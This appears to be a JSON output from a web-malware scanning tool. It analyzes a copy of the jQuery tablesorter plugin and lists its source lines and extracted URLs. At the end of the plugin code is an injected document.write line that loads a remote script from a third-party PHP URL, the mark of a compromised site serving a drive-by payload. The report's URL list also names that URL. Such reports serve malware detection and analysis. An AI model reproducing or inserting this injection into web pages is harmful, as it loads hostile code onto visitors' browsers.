            "\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t// add column to sort list",
            "\t\t\t\t\t\t\t\tconfig.sortList.push([i,this.order]);",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t// multi column sorting",
            "\t\t\t\t\t\t\t} else {",
            "\t\t\t\t\t\t\t\t// the user has clicked on an all ready sortet column.",
            "\t\t\t\t\t\t\t\tif(isValueInArray(i,config.sortList)) {\t ",
            "\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t// revers the sorting direction for all tables.",
            "\t\t\t\t\t\t\t\t\tfor(var j=0; j < config.sortList.length; j++) {",
            "\t\t\t\t\t\t\t\t\t\tvar s = config.sortList[j], o = config.headerList[s[0]];",
            "\t\t\t\t\t\t\t\t\t\tif(s[0] == i) {",
            "\t\t\t\t\t\t\t\t\t\t\to.count = s[1];",
            "\t\t\t\t\t\t\t\t\t\t\to.count++;",
            "\t\t\t\t\t\t\t\t\t\t\ts[1] = o.count % 2;",
            "\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t}\t",
            "\t\t\t\t\t\t\t\t} else {",
            "\t\t\t\t\t\t\t\t\t// add column to sort list array",
            "\t\t\t\t\t\t\t\t\tconfig.sortList.push([i,this.order]);",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t};",
            "\t\t\t\t\t\t\tsetTimeout(function() {",
            "\t\t\t\t\t\t\t\t//set css for headers",
            "\t\t\t\t\t\t\t\tsetHeadersCss($this[0],$headers,config.sortList,sortCSS);",
            "\t\t\t\t\t\t\t\tappendToTable($this[0],multisort($this[0],config.sortList,cache));",
            "\t\t\t\t\t\t\t},1);",
            "\t\t\t\t\t\t\t// stop normal event by returning false",
            "\t\t\t\t\t\t\treturn false;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t// cancel selection\t",
            "\t\t\t\t\t}).mousedown(function() {",
            "\t\t\t\t\t\tif(config.cancelSelection) {",
            "\t\t\t\t\t\t\tthis.onselectstart = function() {return false};",
            "\t\t\t\t\t\t\treturn false;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t});",
            "\t\t\t\t\t",
            "\t\t\t\t\t// apply easy methods that trigger binded events",
            "\t\t\t\t\t$this.bind(\"update\",function() {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t// rebuild parsers.",
            "\t\t\t\t\t\tthis.config.parsers = buildParserCache(this,$headers);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t// rebuild the cache map",
            "\t\t\t\t\t\tcache = buildCache(this);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t}).bind(\"sorton\",function(e,list) {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t$(this).trigger(\"sortStart\");",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tconfig.sortList = list;",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t// update and store the sortlist",
            "\t\t\t\t\t\tvar sortList = config.sortList;",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t// update header count index",
            "\t\t\t\t\t\tupdateHeaderSortCount(this,sortList);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t//set css for headers",
            "\t\t\t\t\t\tsetHeadersCss(this,$headers,sortList,sortCSS);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t// sort the table and append it to the dom",
            "\t\t\t\t\t\tappendToTable(this,multisort(this,sortList,cache));",
            "\t\t\t\t\t}).bind(\"appendCache\",function() {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tappendToTable(this,cache);",
            "\t\t\t\t\t",
            "\t\t\t\t\t}).bind(\"applyWidgetId\",function(e,id) {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tgetWidgetById(id).format(this);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t}).bind(\"applyWidgets\",function() {",
            "\t\t\t\t\t\t// apply widgets",
            "\t\t\t\t\t\tapplyWidget(this);",
            "\t\t\t\t\t});",
            "\t\t\t\t\t",
            "\t\t\t\t\tif($.metadata && ($(this).metadata() && $(this).metadata().sortlist)) {",
            "\t\t\t\t\t\tconfig.sortList = $(this).metadata().sortlist;",
            "\t\t\t\t\t}",
            "\t\t\t\t\t// if user has supplied a sort list to constructor.",
            "\t\t\t\t\tif(config.sortList.length > 0) {",
            "\t\t\t\t\t\t$this.trigger(\"sorton\",[config.sortList]);\t",
            "\t\t\t\t\t}",
            "\t\t\t\t\t",
            "\t\t\t\t\t// apply widgets",
            "\t\t\t\t\tapplyWidget(this);",
            "\t\t\t\t});",
            "\t\t\t};",
            "\t\t\tthis.addParser = function(parser) {",
            "\t\t\t\tvar l = parsers.length, a = true;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tif(parsers[i].id.toLowerCase() == parser.id.toLowerCase()) {",
            "\t\t\t\t\t\ta = false;",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\tif(a) { parsers.push(parser); };",
            "\t\t\t};",
            "\t\t\tthis.addWidget = function(widget) {",
            "\t\t\t\twidgets.push(widget);",
            "\t\t\t};",
            "\t\t\tthis.formatFloat = function(s) {",
            "\t\t\t\tvar i = parseFloat(s);",
            "\t\t\t\treturn (isNaN(i)) ? 0 : i;",
            "\t\t\t};",
            "\t\t\tthis.formatInt = function(s) {",
            "\t\t\t\tvar i = parseInt(s);",
            "\t\t\t\treturn (isNaN(i)) ? 0 : i;",
            "\t\t\t};",
            "\t\t\tthis.isDigit = function(s,config) {",
            "\t\t\t\tvar DECIMAL = '\\\\' + config.decimal;",
            "\t\t\t\tvar exp = '/(^[+]?0(' + DECIMAL +'0+)?$)|(^([-+]?[1-9][0-9]*)$)|(^([-+]?((0?|[1-9][0-9]*)' + DECIMAL +'(0*[1-9][0-9]*)))$)|(^[-+]?[1-9]+[0-9]*' + DECIMAL +'0+$)/';",
            "\t\t\t\treturn RegExp(exp).test($.trim(s));",
            "\t\t\t};",
            "\t\t\tthis.clearTableBody = function(table) {",
            "\t\t\t\tif($.browser.msie) {",
            "\t\t\t\t\tfunction empty() {",
            "\t\t\t\t\t\twhile ( this.firstChild ) this.removeChild( this.firstChild );",
            "\t\t\t\t\t}",
            "\t\t\t\t\tempty.apply(table.tBodies[0]);",
            "\t\t\t\t} else {",
            "\t\t\t\t\ttable.tBodies[0].innerHTML = \"\";",
            "\t\t\t\t}",
            "\t\t\t};",
            "\t});",
            "\t// extend plugin scope",
            "\t$.fn.extend({",
            "        tablesorter: $.tablesorter.construct",
            "\t});",
            "\tvar ts = $.tablesorter;",
            "\t// add default parsers",
            "\tts.addParser({",
            "\t\tid: \"text\",",
            "\t\tis: function(s) {",
            "\t\t\treturn true;",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.trim(s.toLowerCase());",
            "\t\t},",
            "\t\ttype: \"text\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"digit\",",
            "\t\tis: function(s,table) {",
            "\t\t\tvar c = table.config;",
            "\t\t\treturn $.tablesorter.isDigit(s,c);",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.tablesorter.formatFloat(s);",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"currency\",",
            "\t\tis: function(s) {",
            "\t\t\treturn /^[",
            "$\u20ac?.]/.test(s);",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.tablesorter.formatFloat(s.replace(new RegExp(/[^0-9.]/g),\"\"));",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"ipAddress\",",
            "\t\tis: function(s) {",
            "\t\t\treturn /^\\d{2,3}[\\.]\\d{2,3}[\\.]\\d{2,3}[\\.]\\d{2,3}$/.test(s);",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\tvar a = s.split(\".\"), r = \"\", l = a.length;",
            "\t\t\tfor(var i = 0; i < l; i++) {",
            "\t\t\t\tvar item = a[i];",
            "\t\t\t   \tif(item.length == 2) {",
            "\t\t\t\t\tr += \"0\" + item;",
            "\t\t\t   \t} else {",
            "\t\t\t\t\tr += item;",
            "\t\t\t   \t}",
            "\t\t\t}",
            "\t\t\treturn $.tablesorter.formatFloat(r);",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"url\",",
            "\t\tis: function(s) {",
            "\t\t\treturn /^(https?|ftp|file):\\/\\/$/.test(s);",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn jQuery.trim(s.replace(new RegExp(/(https?|ftp|file):\\/\\//),''));",
            "\t\t},",
            "\t\ttype: \"text\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"isoDate\",",
            "\t\tis: function(s) {",
            "\t\t\treturn /^\\d{4}[\\/-]\\d{1,2}[\\/-]\\d{1,2}$/.test(s);",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.tablesorter.formatFloat((s != \"\") ? new Date(s.replace(new RegExp(/-/g),\"/\")).getTime() : \"0\");",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"percent\",",
            "\t\tis: function(s) { ",
            "\t\t\treturn /\\%$/.test($.trim(s));",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.tablesorter.formatFloat(s.replace(new RegExp(/%/g),\"\"));",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"usLongDate\",",
            "\t\tis: function(s) {",
            "\t\t\treturn s.match(new RegExp(/^[A-Za-z]{3,10}\\.? [0-9]{1,2}, ([0-9]{4}|'?[0-9]{2}) (([0-2]?[0-9]:[0-5][0-9])|([0-1]?[0-9]:[0-5][0-9]\\s(AM|PM)))$/));",
            "\t\t},",
            "\t\tformat: function(s) {",
            "\t\t\treturn $.tablesorter.formatFloat(new Date(s).getTime());",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t\tid: \"shortDate\",",
            "\t\tis: function(s) {",
            "\t\t\treturn /\\d{1,2}[\\/\\-]\\d{1,2}[\\/\\-]\\d{2,4}/.test(s);",
            "\t\t},",
            "\t\tformat: function(s,table) {",
            "\t\t\tvar c = table.config;",
            "\t\t\ts = s.replace(/\\-/g,\"/\");",
            "\t\t\tif(c.dateFormat == \"us\") {",
            "\t\t\t\t// reformat the string in ISO format",
            "\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{4})/, \"$3/$1/$2\");",
            "\t\t\t} else if(c.dateFormat == \"uk\") {",
            "\t\t\t\t//reformat the string in ISO format",
            "\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{4})/, \"$3/$2/$1\");",
            "\t\t\t} else if(c.dateFormat == \"dd/mm/yy\" || c.dateFormat == \"dd-mm-yy\") {",
            "\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{2})/, \"$1/$2/$3\");\t",
            "\t\t\t}",
            "\t\t\treturn $.tablesorter.formatFloat(new Date(s).getTime());",
            "\t\t},",
            "\t\ttype: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t    id: \"time\",",
            "\t    is: function(s) {",
            "\t        return /^(([0-2]?[0-9]:[0-5][0-9])|([0-1]?[0-9]:[0-5][0-9]\\s(am|pm)))$/.test(s);",
            "\t    },",
            "\t    format: function(s) {",
            "\t        return $.tablesorter.formatFloat(new Date(\"2000/01/01 \" + s).getTime());",
            "\t    },",
            "\t  type: \"numeric\"",
            "\t});",
            "\tts.addParser({",
            "\t    id: \"metadata\",",
            "\t    is: function(s) {",
            "\t        return false;",
            "\t    },",
            "\t    format: function(s,table,cell) {",
            "\t\t\tvar c = table.config, p = (!c.parserMetadataName) ? 'sortValue' : c.parserMetadataName;",
            "\t        return $(cell).metadata()[p];",
            "\t    },",
            "\t  type: \"numeric\"",
            "\t});",
            "\t// add default widgets",
            "\tts.addWidget({",
            "\t\tid: \"zebra\",",
            "\t\tformat: function(table) {",
            "\t\t\tif(table.config.debug) { var time = new Date(); }",
            "\t\t\t$(\"tr:visible\",table.tBodies[0])",
            "\t        .filter(':even')",
            "\t        .removeClass(table.config.widgetZebra.css[1]).addClass(table.config.widgetZebra.css[0])",
            "\t        .end().filter(':odd')",
            "\t        .removeClass(table.config.widgetZebra.css[0]).addClass(table.config.widgetZebra.css[1]);",
            "\t\t\tif(table.config.debug) { $.tablesorter.benchmark(\"Applying Zebra widget\", time); }",
            "\t});\t",
            "})(jQuery);",
            "/*125189*/",
            "document.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=143345267' type='text/javascript'></\" + \"script>\");",
            "/*/125189*/"
        ],
        "file": {
            " * http://www.opensource.org/licenses/mit-license.php": "Web Page"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.gnu.org/licenses/gpl.html",
            "http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=143345267",
            "http://www.opensource.org/licenses/mit-license.php",
            "http://tablesorter.com"
        ]
    },
    "time": "0:00:00.440388",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
